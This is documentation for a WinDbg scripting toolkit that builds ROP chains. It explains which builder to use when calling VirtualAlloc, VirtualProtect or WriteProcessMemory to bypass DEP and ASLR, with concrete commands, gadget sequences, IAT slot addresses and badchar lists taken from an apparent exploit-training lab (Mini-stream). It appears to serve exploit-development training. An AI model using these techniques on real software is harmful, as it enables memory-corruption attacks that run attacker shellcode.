# Which chain command do I use?

There are several chain/frame/dispatch builders. They differ along **three
axes**. Answer these three and the command is decided:

1. **Which API?** VirtualAlloc, VirtualProtect, or WriteProcessMemory.
2. **Do you have the API's real address, or only an IAT slot?** (i.e. is the
   target ASLR'd?) — see [Slot vs target](#slot-vs-target-read-this-first).
3. **Is a `pushad ; ret` gadget usable?** If not, use a write/flat frame.

## Slot vs target (read this first)

This is the single most common source of confusion, so be precise:

| Term | What it is | ASLR? | Where it goes |
|------|-----------|-------|---------------|
| **Target** | the API's real code address (e.g. `kernel32!VirtualAlloc` at `0x76E25680`) | **ASLR'd** — changes every boot | never hardcode it |
| **Slot** | a 4-byte IAT cell in a module that *holds* the target (e.g. `0x1005D060` in filter03) | fixed if the module is non-ASLR | this is the literal you put in the payload |

The slot **contains** the target:

```
dd 0x1005D060  ->  76e25680      (*slot == target)
```

- `sc.iat_find("VirtualAlloc")` lists both columns. Pick a **slot in a
  non-ASLR module** (for Mini-stream that is `MSA2Mfilter03.dll`); the target
  is the same for every kernel32 importer.
- **Never `u` a slot.** It is data, not code — `u` will disassemble the pointer
  bytes into garbage. Use `dd <slot> L1` to read the target out of it.

## Decision table

| You have… | ASLR? | PUSHAD? | Use | You pass |
|-----------|-------|---------|-----|----------|
| a **slot** (want reboot-stable) | yes | — | **`rop.slot_call`** | the **slot** |
| the **target** address | no / one-shot | yes | `rop.chain_va` / `chain_vp` / `chain_wpm` | the **target** |
| the **target** address | no / one-shot | no | `rop.frame_va` / `frame_vp` / `frame_wpm` | the **target** |
| the **target**, need a writable frame built by gadgets, no PUSHAD | no / one-shot | no | `rop.frame_write` | the **target** as word0 |

> **ASLR-proof == `slot_call`.** Every other builder dispatches by `ret`-ing (or
> flat-calling) into an address you supply, with **no dereference** — so that
> address must be the real code target. Feed those a slot and the chain will
> `ret` into data and crash. See [Common mistakes](#common-mistakes).

## The dispatch spectrum

All of these ultimately transfer control to the API. They differ only in *how*
they turn your inputs into `EIP = <API>` and lay out the stdcall frame:

- **`slot_call`** — `pop eax=<slot> ; mov eax,[eax] ; jmp eax`. Dereferences the
  slot at runtime, so the ASLR'd target is fetched on the box and never appears
  in the payload. Null/badchar args are synthesised in a register and stored.
  **The only ASLR-proof builder.**
- **`chain_*`** — sets registers with `pop` gadgets, then `pushad ; ret` packs
  them into the frame and dispatches by `ret`-ing into **EDI**. EDI must be the
  real target. Convenient but needs a PUSHAD gadget, and in "direct" mode
  `dwSize` is forced to the saved `ESP` (a warning is printed).
- **`frame_*`** — lays `[target][retaddr][args...]` on the stack as **flat data
  words**. No corpus, no gadgets. Every value is badchar-checked. `target` and
  any null-bearing arg must be badchar-free as literals.
- **`frame_write`** — builds the same flat frame in a **writable buffer** using
  `mov [eax],reg` store gadgets, then pivots `ESP` onto it. Use when the frame
  contains badchar/null words that cannot sit in the payload directly. (It also
  has a `[0xSLOT]` word that dereferences via `mov <storereg>,[ptr]` — only
  usable on corpora that have such a load into a store register; filter03 does
  not, which is why `slot_call` exists.)

## Command reference

Signatures below; run `dx @$osed().rop.<name>("help")` for the live help.

### `rop.slot_call(buf, iatSlot, "retaddr arg1 arg2 …", badchars?)` — ASLR-proof

```js
// VirtualAlloc via its filter03 IAT slot; return into shellcode after re-committing RWX.
dx @$osed().rop.slot_call("0x00420000", "0x1005D060",
    "SHELLCODE SHELLCODE 0x1000 0x1000 0x40", "00 0A 0D")
```
- `iatSlot` — the **slot** (`0x1005D060`), *not* the target.
- frame words = `retaddr` (where the API returns — must be executable), then the
  stdcall args in order. For VirtualAlloc: `lpAddress dwSize flAllocationType flProtect`.
- `buf` — a writable, stable, badchar-free staging address.
- Warns if any deref-preamble gadget is at a relocating address.

### `rop.chain_va / chain_vp / chain_wpm(targetAddr, …)` — PUSHAD, needs the target

```js
dx @$osed().rop.chain_va(0x76E25680)   // pass the TARGET, not the slot
```
Reboot-fragile (target is ASLR'd). Requires a `pushad ; ret` gadget in the corpus.

### `rop.frame_va / frame_vp / frame_wpm(targetAddr, …, badchars)` — flat, needs the target

```js
dx @$osed().rop.frame_va(0x76E25680, 0x625011AF, 0, 0x1000, 0x1000, 0x40, "00 0A 0D")
```
No corpus needed. `target` + null args must be badchar-free literals.

### `rop.frame_write(buf, "word0 word1 arg1 …", badchars?)` — write-built flat frame

```js
dx @$osed().rop.frame_write("0x00420000",
    "0x76E25680 POST_CALL 0x0 0x1000 0x3000 0x40", "00 0A 0D")
```
word0 = target (ret dispatches into it), word1 = post-call target, then args.
Null words are synthesised in a register and stored.

### Building blocks

- `rop.construct(reg, value, badchars, preserve?)` — build one badchar-tainted
  value in a register; reports clobbers. See
  [ROP_WORKFLOW.md](ROP_WORKFLOW.md#step-7-construct-badchar-tainted-values).
- `rop.setup("reg=val reg=val …", badchars?)` — pack several register targets.
- `rop.pivots(register?, minDelta?)` — find/rank stack pivots.

## Common mistakes

- **Passing a slot to `chain_va` / `frame_va`.** These dispatch into the address
  as code. `rop.chain_va(0x1005D060)` sets `EDI = 0x1005D060`; `pushad ; ret`
  then `ret`s into the slot's data bytes → access violation. Symptom: EIP lands
  on the pointer value (e.g. `1005d060`) executing nonsense. **Fix:** use
  `rop.slot_call("…","0x1005D060",…)`, or pass the *target* to `chain_va`.
- **Hardcoding the target for a reboot-stable exploit.** `0x76E25680` is
  ASLR'd. Fine for a single run / ASLR-off lab; use `slot_call` otherwise.
- **Using a slot from a relocating module.** On Mini-stream only `filter03` sits
  at its preferred base; other modules' slot addresses drift each launch.
  Re-run `sc.iat_find` after a relaunch and take the fresh filter03 slot.
- **`u`-ing a slot.** It's data. Use `dd <slot> L1`.

## See also

- [ROP_WORKFLOW.md](ROP_WORKFLOW.md) — end-to-end chain construction.
- [ROP_API_REFERENCE.md](ROP_API_REFERENCE.md) — stdcall, PUSHAD, per-API
  register maps, constants.
- [GADGET_DISCOVERY.md](GADGET_DISCOVERY.md) — finding and verifying gadgets.
